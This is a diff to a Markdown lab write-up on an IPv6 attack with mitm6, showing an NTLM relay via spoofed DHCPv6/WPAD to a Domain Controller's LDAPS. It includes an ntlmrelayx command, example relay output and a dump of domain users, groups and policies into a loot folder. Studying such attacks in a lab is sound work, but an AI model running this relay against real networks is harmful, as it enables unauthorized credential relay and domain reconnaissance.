@@ -16,9 +16,9 @@
    - [Step 2 — Launch NTLM Relay](#step-2--launch-ntlm-relay)
    - [Step 3 — Trigger Authentication from Victim](#step-3--trigger-authentication-from-victim)
    - [Step 4 — Relay Succeeds & Loot Retrieved](#step-4--relay-succeeds--loot-retrieved)
-   - [Step 5 — Browse SMB Shares on Victim](#step-5--browse-smb-shares-on-victim)
-   - [Step 6 — Explore Loot Folder](#step-6--explore-loot-folder)
-   - [Step 7 — Credential & Domain Dump](#step-7--credential--domain-dump)
+   <!-- - [Step 5 — Browse SMB Shares on Victim](#step-5--browse-smb-shares-on-victim) -->
+   - [Step 5 — Explore Loot Folder](#step-6--explore-loot-folder)
+   - [Step 6 — Credential & Domain Dump](#step-7--credential--domain-dump)
 6. [Understanding the Output](#understanding-the-output)
 7. [Mitigations & Defenses](#mitigations--defenses)
 8. [Key Takeaways](#key-takeaways)
@@ -179,10 +179,73 @@ ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootm
 On the victim machine (Windows 10), simply restart the machine.
 Windows will automatically:
 
-- 1. Send a DHCPv6 Solicit — mitm6 responds
-- 2. Query DNS for WPAD — mitm6 answers, pointing to the attacker
-- 3. Windows attempts to fetch http://fakewpad.roadteambd.local/wpad.dat
-- 4. ntlmrelayx demands NTLM authentication
-- 5. Windows transparently authenticates using the logged-in user's credentials
+```
+1. Send a DHCPv6 Solicit — mitm6 responds
+2. Query DNS for WPAD — mitm6 answers, pointing to the attacker
+3. Windows attempts to fetch http://fakewpad.roadteambd.local/wpad.dat
+4. ntlmrelayx demands NTLM authentication
+5. Windows transparently authenticates using the logged-in user's credentials
+```
 
 > *"No user interaction is required once the victim logs into Windows. The attack is completely silent."*
+
+## Step 4 — Relay Succeeds & Loot Retrieved
+
+When the victim machine sends an authentication request, `ntlmrelayx` receives it and relays it to the Domain Controller’s LDAP service.
+
+Example output:
+
+```text
+[*] HTTPD(80): Connection from 192.168.5.135 controlled, attacking target ldaps://192.168.5.134
+[*] HTTPD(80): Authenticating against ldaps://192.168.5.134 as readteambd\victim-1$ SUCCEED
+[*] Enumerating relayed user's privileges. This may take a while on large domains...
+[*] Dumping domain info for first time
+[*] Domain info dumped into lootme!
+```
+
+After a successful relay, domain information is saved in the `lootme` directory.
+
+<p align="center">
+  <img src="/writeups/IPv6 Attack with mitm6/images/step3.png" width="600">
+</p>
+
+## Step 5 — Explore Loot Folder
+Navigate to the ./lootme directory created by ntlmrelayx. It contains structured LDAP dump files:
+
+```
+lootme/
+├── domain_computers.html
+├── domain_computers_by_os.html
+├── domain_groups.html
+├── domain_policy.html
+├── domain_trusts.html
+├── domain_users.html
+├── domain_users_by_group.html
+└── domain_users.grep
+```
+Open domain_users_by_group.html
+
+<p align="center">
+  <img src="/writeups/IPv6 Attack with mitm6/images/step5-1.png" width="600">
+</p>
+<p align="center">
+  <img src="/writeups/IPv6 Attack with mitm6/images/step5-2.png" width="600">
+</p>
+<p align="center">
+  <img src="/writeups/IPv6 Attack with mitm6/images/step5-3.png" width="600">
+</p>
+
+
+
+
+
+
+
+## References
+
+mitm6 GitHub
+Impacket GitHub
+Fox-IT Blog: mitm6 — Compromising IPv4 networks via IPv6
+Microsoft KB4520412 — LDAP channel binding and signing
+SpecterOps: Relay Attacks
+CrackMapExec
